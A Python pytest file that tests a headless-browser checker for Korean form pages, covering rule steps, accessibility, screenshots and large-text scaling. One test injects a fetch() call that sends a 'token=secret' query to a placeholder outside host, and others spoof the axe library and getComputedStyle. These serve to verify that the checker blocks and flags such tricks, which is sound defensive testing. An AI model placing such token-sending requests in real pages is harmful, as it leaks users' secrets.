import base64
import os

import pytest

from workspace.browser import evaluate_html


HTML = """<!doctype html><html lang="ko"><head><meta charset="utf-8"><title>가입 예시</title>
<style>body{background:white;color:black;font-family:Arial,sans-serif;margin:20px}
button,input{font:inherit;padding:10px}label{display:block;margin-top:16px}</style></head>
<body><main><h1>가입 정보</h1><label for="amount">납입 금액</label>
<input id="amount" data-testid="amount" value="300000">
<button type="button" data-testid="next" onclick="document.querySelector('[data-testid=summary]').textContent=document.getElementById('amount').value">다음</button>
<p data-testid="summary">300000</p>
<label><input type="checkbox" data-testid="agree" onchange="document.querySelector('[data-testid=submit]').disabled=!this.checked">필수 약관 동의</label>
<button type="button" data-testid="submit" disabled>제출</button></main></body></html>"""


def contract():
    return {"title": "입력·동의 검사", "rules": [
        {"id": "R1", "title": "변경한 금액 전달", "steps": [
            {"action": "fill", "target": "amount", "value": "10000"},
            {"action": "click", "target": "next"},
            {"action": "expectText", "target": "summary", "value": "10000", "match": "equals"}]},
        {"id": "R2", "title": "동의 전 제출 차단과 회복", "steps": [
            {"action": "expectEnabled", "target": "submit", "value": False},
            {"action": "check", "target": "agree", "value": True},
            {"action": "expectEnabled", "target": "submit", "value": True}]},
    ]}


@pytest.fixture(autouse=True)
def local_browser(monkeypatch):
    if not os.environ.get("WORKSPACE_CHROMIUM_PATH"):
        candidate = "/home/atomoh/.cache/ms-playwright/chromium_headless_shell-1208/chrome-linux/headless_shell"
        if os.path.isfile(candidate):
            monkeypatch.setenv("WORKSPACE_CHROMIUM_PATH", candidate)


def test_real_interactions_pass_and_static_summary_is_rejected():
    good = evaluate_html(HTML, contract())
    assert good["functionalStatus"] == "pass", good
    assert good["passed"], good
    assert good["accessibility"]["status"] == "pass"
    broken = HTML.replace("textContent=document.getElementById('amount').value", "textContent='300000'")
    bad = evaluate_html(broken, contract())
    assert bad["functionalStatus"] == "fail" and not bad["passed"]
    failed = bad["checks"][0]["steps"][-1]
    assert failed["expected"] == "10000" and failed["actual"] == "300000"


def test_network_attempts_and_missing_assertion_targets_cannot_pass():
    remote = HTML.replace("</main>", '<script>fetch("https://blocked.invalid/private?token=secret")</script></main>')
    result = evaluate_html(remote, contract())
    assert result["networkRequests"] and not result["passed"]
    assert not any("?token=" in value for value in result["networkRequests"])
    missing = HTML.replace('data-testid="amount"', 'data-testid="other"')
    assert not evaluate_html(missing, contract())["passed"]


def test_actual_pixel_reference_and_size_mismatch_are_distinguished():
    current = evaluate_html(HTML, contract())
    reference = base64.b64decode(current["screenshotBase64"])
    same = evaluate_html(HTML, contract(), reference_png=reference, visual_tolerance=0)
    assert same["visual"]["status"] == "pass" and same["visual"]["changedRatio"] == 0
    changed = evaluate_html(HTML.replace("background:white", "background:#eee"), contract(),
                            reference_png=reference, visual_tolerance=0.15)
    assert changed["visual"]["status"] == "fail" and not changed["passed"]


def test_a11y_after_transition_cannot_be_spoofed_by_application_globals():
    import io
    from PIL import Image
    png = io.BytesIO()
    Image.new("RGB", (8, 8), "red").save(png, "PNG")
    uri = "data:image/png;base64," + base64.b64encode(png.getvalue()).decode()
    html = HTML.replace("textContent=document.getElementById('amount').value",
        "textContent=document.getElementById('amount').value;"
        f"const image=document.createElement('img');image.src='{uri}';document.querySelector('main').append(image)")
    html = html.replace("</head>", """<script>Object.defineProperty(window,'axe',{
      value:{run:async()=>({violations:[],incomplete:[]})},writable:false,configurable:false});</script></head>""")
    result = evaluate_html(html, contract())
    assert not result["passed"]
    assert any(v["id"] == "image-alt" and v["state"] == "R1:final" for v in result["accessibility"]["violations"])


def test_computed_styles_use_trusted_world_not_application_function():
    html = HTML.replace("</head>", """<script>window.getComputedStyle=()=>({color:'rgb(255, 0, 0)'});</script></head>""")
    rules = {"title": "실제 색상", "rules": [{"id": "R1", "title": "빨간 글자 확인",
             "steps": [{"action": "expectStyle", "target": "amount", "property": "color", "value": "#ff0000"}]}]}
    result = evaluate_html(html, rules)
    assert result["functionalStatus"] == "fail" and not result["passed"]
    assert result["checks"][0]["steps"][0]["actual"] != "rgb(255, 0, 0)"


def test_invisible_dom_values_are_not_a_working_ui():
    result = evaluate_html(HTML.replace("<main>", '<main style="opacity:0">'), contract())
    assert result["functionalStatus"] == "fail" and not result["passed"]


def test_delayed_targets_are_waited_for_before_asserting():
    html = """<!doctype html><html lang="ko"><head><title>비동기 화면</title></head>
    <body><main><h1>처리 확인</h1><button data-testid="next" onclick="setTimeout(()=>{
      const p=document.createElement('p');p.dataset.testid='summary';p.textContent='준비 완료';
      document.querySelector('main').append(p)},200)">다음</button></main></body></html>"""
    rules = {"title": "늦게 나타나는 확인 화면", "rules": [{"id": "R1", "title": "처리 후 확인 문구",
             "steps": [{"action": "click", "target": "next"},
                       {"action": "expectText", "target": "summary", "value": "준비 완료"}]}]}
    result = evaluate_html(html, rules)
    assert result["functionalStatus"] == "pass" and result["passed"], result


def test_each_rule_starts_with_fresh_browser_state():
    rules = {"title": "독립된 검증 상태", "rules": [
        {"id": "R1", "title": "입력값 변경", "steps": [
            {"action": "fill", "target": "amount", "value": "10000"},
            {"action": "expectValue", "target": "amount", "value": "10000"}]},
        {"id": "R2", "title": "다음 규칙은 원래 상태에서 시작", "steps": [
            {"action": "expectValue", "target": "amount", "value": "300000"}]},
    ]}
    result = evaluate_html(HTML, rules)
    assert result["passed"] and len(result["checks"]) == 2, result
    assert not result.get("engineError")


# ---- large-text second pass (engine plan Task E12a; V-02, review round 3 F11) ------------------------------------

SCALED = """<!doctype html><html lang="ko"><head><meta charset="utf-8"><title>큰글씨</title>
<style>body{font-family:Arial,sans-serif;margin:20px;font-size:calc(var(--studio-text-scale,1)*16px)}</style></head>
<body><main><h1 style="font-size:calc(var(--studio-text-scale,1)*24px)">큰글씨 확인</h1>
<div data-testid="box" style="width:150px;white-space:nowrap;overflow:hidden">가나다라마바사</div>
<p data-testid="fixed" style="font-size:16px">고정 크기</p><p data-testid="fluid">배율 적용</p></main></body></html>"""
SCALED_RULES = {"title": "큰글씨", "rules": [{"id": "R1", "title": "문구 확인", "steps": [
    {"action": "expectText", "target": "fluid", "value": "배율 적용"}]}]}


def test_default_scale_has_no_large_text_pass():
    result = evaluate_html(SCALED, SCALED_RULES)
    assert result["passed"], result["blockingFindings"]
    assert "largeText" not in result


def test_fixed_width_container_overflows_and_fixed_size_is_unscaled_at_scale_two():
    result = evaluate_html(SCALED, SCALED_RULES, text_scale=2)
    assert result["functionalStatus"] == "pass"
    large = result["largeText"]
    assert large["status"] == "fail" and "box" in large["overflow"] and large["unscaled"] == ["fixed"]
    assert "fluid" not in large["overflow"] and not result["passed"]
    clean = SCALED.replace('<div data-testid="box" style="width:150px;white-space:nowrap;overflow:hidden">가나다라마바사</div>', "") \
        .replace(' style="font-size:16px"', "")
    assert evaluate_html(clean, SCALED_RULES, text_scale=2)["largeText"] == {"status": "pass", "overflow": [], "unscaled": []}


TRANSITION = """<!doctype html><html lang="ko"><head><meta charset="utf-8"><title>화면 전환</title>
<style>body,button{font-family:Arial,sans-serif;margin:20px;font-size:calc(var(--studio-text-scale,1)*16px)}
#screen2{display:none}</style></head>
<body><main>
<div id="screen1"><p data-testid="overflowing" style="width:60px;white-space:nowrap;overflow:hidden">고정 크기 문구입니다</p>
<button type="button" data-testid="next" onclick="document.getElementById('screen1').style.display='none';
document.getElementById('screen2').style.display='block'">다음</button></div>
<div id="screen2"><p data-testid="fine">완료</p></div>
</main></body></html>"""
TRANSITION_RULES = {"title": "화면 전환", "rules": [{"id": "R1", "title": "다음 화면 이동", "steps": [
    {"action": "click", "target": "next"}, {"action": "expectText", "target": "fine", "value": "완료"}]}]}


def test_navigating_away_does_not_let_a_screen_escape_large_text_measurement():
    """PR #30 review round 2, #3: an overflowing element on the FIRST screen must be caught even though the rule
    navigates away to a clean second screen before finishing; measuring only the final state misses it."""
    result = evaluate_html(TRANSITION, TRANSITION_RULES, text_scale=2)
    assert result["largeText"]["status"] == "fail", result["largeText"]
    assert "overflowing" in result["largeText"]["overflow"], result["largeText"]
    assert not result["passed"], result["blockingFindings"]


def test_text_scale_is_bounded():
    import pytest
    for bad in (0.5, 4, True, "2"):
        with pytest.raises(ValueError):
            evaluate_html(SCALED, SCALED_RULES, text_scale=bad)


def test_real_kit_bundle_scales_every_text_node():
    import shutil
    from pathlib import Path
    import pytest
    root = Path(__file__).resolve().parents[1] / "react-kit"
    if not (root / "node_modules").exists() or not shutil.which("node"):
        pytest.skip("react-kit")
    from design_loop.react_project import compile_local, compile_request, kit_catalog_hash
    from workspace.browser import evaluate_bundle
    app = """import {useState} from 'react';
import {Screen,Stack,Text,Button,Input,Summary,Alert} from '@studio/approved-ui';
export default function App(){
 const [amount,setAmount]=useState('300000');
 return <Screen pageId="entry" testId="entry" title="큰글씨 확인" width="mobile"><Stack>
 <Text testId="text">본문 문장</Text><Input testId="amount" label="금액" value={amount} onChange={setAmount}/>
 <Summary testId="summary" items={[{label:'금리',value:'표시값'}]}/><Alert testId="alert" message="안내"/>
 <Button testId="next" label="다음" onClick={()=>setAmount('1')}/></Stack></Screen>;
}"""
    rules = {"title": "큰글씨", "rules": [{"id": "R1", "title": "문구", "steps": [
        {"action": "click", "target": "next"}, {"action": "expectValue", "target": "amount", "value": "1"}]}]}
    out = compile_local(compile_request({"src/App.tsx": app}, catalog_hash=kit_catalog_hash(), contract=rules))
    assert out["ok"], out.get("diagnostics")
    files = {name: base64.b64decode(value) for name, value in out["files"].items()}
    assert "largeText" not in evaluate_bundle(files, rules)
    result = evaluate_bundle(files, rules, text_scale=2)
    assert result["largeText"] == {"status": "pass", "overflow": [], "unscaled": []}, result["largeText"]
    assert result["passed"], result["blockingFindings"]
